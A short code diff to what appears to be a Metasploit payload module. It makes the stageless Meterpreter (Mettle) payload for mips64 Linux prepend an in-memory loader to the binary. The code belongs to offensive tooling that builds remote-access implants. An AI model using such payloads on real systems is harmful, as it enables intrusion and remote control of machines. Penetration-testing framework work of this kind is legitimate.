@@ -12,6 +12,7 @@ module MetasploitModule
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions
   include Msf::Sessions::MettleConfig
+  include Msf::Payload::Linux::Mips64::MeterpreterLoader
 
   def initialize(info = {})
     super(
@@ -38,6 +39,7 @@ module MetasploitModule
       scheme: 'tcp',
       stageless: true
     }.merge(mettle_logging_config)
-    MetasploitPayloads::Mettle.new('mips64-linux-muslsf', generate_config(opts)).to_binary :exec
+    payload = MetasploitPayloads::Mettle.new('mips64-linux-muslsf', generate_config(opts)).to_binary :exec
+    in_memory_load(payload) + payload
   end
 end
